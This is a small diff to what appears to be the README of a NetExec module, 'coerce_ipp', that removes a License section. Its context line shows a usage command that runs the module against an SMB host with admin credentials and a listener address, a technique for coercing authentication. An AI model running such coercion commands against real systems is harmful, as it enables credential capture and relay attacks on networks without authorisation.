@@ -103,6 +103,3 @@ nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp -o LISTENER=10.10.10.1
 - Original technique: [BOF-coerce-ipp](https://github.com/sup3rDav3/IPP)
 - Built as a module for [NetExec](https://github.com/Pennyw0rth/NetExec)
 
-## License
-
-See the repository for license details.
